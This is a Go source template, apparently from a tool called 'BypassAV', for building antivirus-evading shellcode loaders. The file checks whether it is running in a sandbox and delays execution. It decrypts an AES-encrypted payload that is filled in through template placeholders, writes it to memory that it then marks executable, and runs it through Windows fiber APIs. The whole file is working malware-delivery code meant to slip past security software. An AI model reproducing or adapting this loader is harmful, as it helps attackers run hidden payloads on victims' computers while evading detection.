package main

import (
	"BypassAV/In/encrypt"
	"BypassAV/In/sandbox"
	"encoding/hex"
	"golang.org/x/sys/windows"
	"strconv"
	"time"
	"unsafe"
)
var (
	aeskey = "{{.AesKey}}"
	sc  = "{{.Exshell}}"
	Kmode = "{{.Keymode}}"
)

func main() {
	sandbox.See_through()
	time.Sleep(10 * time.Second)

	shellcode :={{.Func}}(sc)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")


	fiberAddr, _, _ := ConvertThreadToFiber.Call()

	addr, _ :=windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var oldProtect uint32 = windows.PAGE_READWRITE
	windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)

	fiber, _, _ := CreateFiber.Call(0, addr, 0)
	SwitchToFiber.Call(fiber)
	SwitchToFiber.Call(fiberAddr)

}

func {{.Func}}(src string)[]byte{
	i,_ := strconv.Atoi(Kmode)
	skey, _ := hex.DecodeString(aeskey)
	aes:= encrypt.NewAES() // 默认是Cbc 模式
	aes.SetMode(i)
	bsrc :=encrypt.Bagua_de(src)
	shell := encrypt.Aes_de(bsrc,skey,aes)
	return shell
}
